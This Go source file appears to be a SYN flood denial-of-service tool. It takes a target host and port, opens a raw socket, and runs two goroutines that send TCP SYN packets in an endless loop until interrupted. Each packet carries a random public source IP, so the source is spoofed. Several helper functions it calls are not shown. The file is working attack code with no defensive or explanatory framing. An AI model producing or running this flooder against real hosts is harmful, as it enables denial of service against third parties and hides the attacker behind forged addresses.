package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {

	host := flag.String("host", "", "destination ip")
	port := flag.Int("port", 0, "destination port")
	flag.Parse()

	dstIp := net.ParseIP(*host)
	dstPort := uint16(*port)

	rawSocket, err := NewRawSocket(dstIp)
	if err != nil {
		log.Fatalf("new raw socket: %v", err)
	}

	wg := &sync.WaitGroup{}
	ctx, cancelFunc := context.WithCancel(context.Background())
	for i := 0; i < 2; i++ {
		wg.Add(1)
		go Run(wg, ctx, rawSocket, dstIp, dstPort)
	}

	termChan := make(chan os.Signal, 1)
	signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)
	<-termChan
	log.Println("received term signal")
	cancelFunc()
	wg.Wait()
	log.Println("done")
}

func Run(wg *sync.WaitGroup, ctx context.Context, rawSocket RawSocket, dstIp net.IP, dstPort uint16) {

	for {
		select {
		case <-ctx.Done():
			log.Println("canceling")
			wg.Done()
			return
		default:
			if err := SendSYN(rawSocket, dstIp, dstPort); err != nil {
				log.Printf("send SYN: %v", err)
			}
		}
	}
}

func SendSYN(rawSocket RawSocket, dstIp net.IP, dstPort uint16) error {

	srcIp := GetRandPublicIP()
	tcpHeaderBytes, err := GetTCPSYNHeaderBytes(srcIp, dstIp, dstPort)
	if err != nil {
		return fmt.Errorf("get TCP header: %w", err)
	}

	ipv4Header := GetIPV4Header(srcIp, dstIp, len(tcpHeaderBytes), syscall.IPPROTO_TCP)
	ipv4HeaderBytes, _ := ipv4Header.Marshal()

	data := append(ipv4HeaderBytes, tcpHeaderBytes...)

	if err := rawSocket.Send(data); err != nil {
		return fmt.Errorf("send data to: %w", err)
	}
	return nil
}
